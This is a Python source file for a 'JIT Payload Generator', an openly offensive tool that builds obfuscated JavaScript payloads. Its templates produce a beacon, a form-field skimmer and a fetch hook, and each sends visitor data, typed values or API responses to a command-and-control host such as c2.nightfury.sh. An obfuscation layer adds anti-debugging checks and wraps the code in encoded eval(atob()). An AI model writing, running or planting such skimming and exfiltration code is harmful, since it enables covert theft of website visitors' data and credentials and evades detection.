import base64
import random
import string

class JITPayloadGenerator:
    """
    Advanced 2026-grade JIT (Just-In-Time) Payload Generator.
    Focuses on polymorphic execution and behavior-based evasion.
    """
    def __init__(self):
        self.templates = {
            "web_beacon": self._template_web_beacon,
            "dom_hijack": self._template_dom_hijack,
            "api_exfil": self._template_api_exfil
        }

    def _generate_random_var(self, length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    def _obfuscate_js(self, code):
        """Applies multi-stage polymorphic obfuscation to JS code."""
        # Stage 1: Variable substitution
        vars_to_replace = ["target", "data", "callback", "endpoint", "buffer", "fetch", "originalFetch"]
        for v in vars_to_replace:
            code = code.replace(v, self._generate_random_var())
        
        # Stage 2: Anti-Debugging and Sandbox Detection
        anti_debug = f"""
        (function() {{
            const start = Date.now();
            debugger;
            if (Date.now() - start > 100) {{
                // Debugger detected, aborting
                return;
            }}
            if (window.chrome && !window.chrome.runtime) {{
                // Potential headless browser detected
                // return; 
            }}
        }})();
        """
        code = anti_debug + code

        # Stage 3: String splitting and encoding
        # Stage 4: Dynamic evaluation wrapper with multi-layer encoding
        b64_code = base64.b64encode(code.encode()).decode()
        encoded_code = "".join([f"\\x{ord(c):02x}" for c in b64_code])
        return f"eval(atob('{encoded_code}'.replace(/\\\\x/g, '')))"

    def _template_web_beacon(self, c2_url):
        code = f"""
        const endpoint = '{c2_url}';
        const data = {{
            ts: Date.now(),
            ua: navigator.userAgent,
            loc: window.location.href
        }};
        fetch(endpoint, {{
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
        }});
        """
        return self._obfuscate_js(code)

    def _template_dom_hijack(self, selector, action_url):
        code = f"""
        const target = document.querySelector('{selector}');
        if (target) {{
            target.addEventListener('change', (e) => {{
                fetch('{action_url}', {{
                    method: 'POST',
                    body: JSON.stringify({{ val: e.target.value }})
                }});
            }});
        }}
        """
        return self._obfuscate_js(code)

    def _template_api_exfil(self, api_endpoint, c2_url):
        code = f"""
        const originalFetch = window.fetch;
        window.fetch = async (...args) => {{
            const response = await originalFetch(...args);
            if (args[0].includes('{api_endpoint}')) {{
                const clone = response.clone();
                const data = await clone.text();
                originalFetch('{c2_url}', {{ method: 'POST', body: data }});
            }}
            return response;
        }};
        """
        return self._obfuscate_js(code)

    def build_payload(self, ptype, **kwargs):
        if ptype in self.templates:
            return self.templates[ptype](**kwargs)
        return None

if __name__ == "__main__":
    gen = JITPayloadGenerator()
    print("[*] JIT Payload Generator Initialized")
    print(gen.build_payload("web_beacon", c2_url="https://c2.nightfury.sh/collect"))
